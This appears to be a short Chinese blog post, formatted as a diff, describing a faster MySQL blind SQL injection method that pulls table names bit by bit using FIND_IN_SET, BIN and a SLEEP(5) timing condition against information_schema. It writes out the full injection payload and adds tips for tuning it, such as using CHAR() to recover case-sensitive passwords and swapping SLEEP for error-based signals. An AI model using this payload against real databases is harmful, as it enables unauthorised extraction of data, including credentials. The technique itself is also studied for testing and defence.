@@ -1,0 +1,25 @@
+MySQL盲注中提升猜解效率的新方法。
+
+此方法比二分法、位推法等更好一点，
+原文地址http://websec.ca/blog/view/optim ... tion_data_retrieval
+
+查询请求示例：
+
+AND (SELECT @a:=MID(BIN(FIND_IN_SET(MID(table_name,1,1), ‘a,b,c,d,e,f
+
+,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9,_,!,@,#,
+
+$,%,^,&,*,(,),-,+,=,\,,.,”,\’,~,`,\\,|,{,},[,],:,;, ,’)),1,1) FROM in
+
+formation_schema.tables LIMIT 1)=@a AND IF(@a!=”,@a,SLEEP(5));
+
+
+
+
+1为正，0则为假，SLEEP(5)延时为空（表示为末位）。
+
+原理可以参考原文，方法优点在于请求次数更少，不足在于不能确定大小写（MySQL字符串比较不区分)、SLEEP()用时过长等 等 。
+
+很多可以优化的地方，如猜用户名只需要a-z0-9就一般够用了，密码这种区分大小写的得用CHAR()才行，像这样FIND_IN_SET(CHAR(MID(table_name,1,1)), ’97,98,99′)
+
+，SLEEP()太费时间，可以考虑利用runtime报错(如1/0,escape&reg;ex…)，还有第一位根本不用猜解，肯定恒为1等 等 ，要想利用这技术这些都得考虑进去，不过总的来说这方法还是很犀利的，很佩服
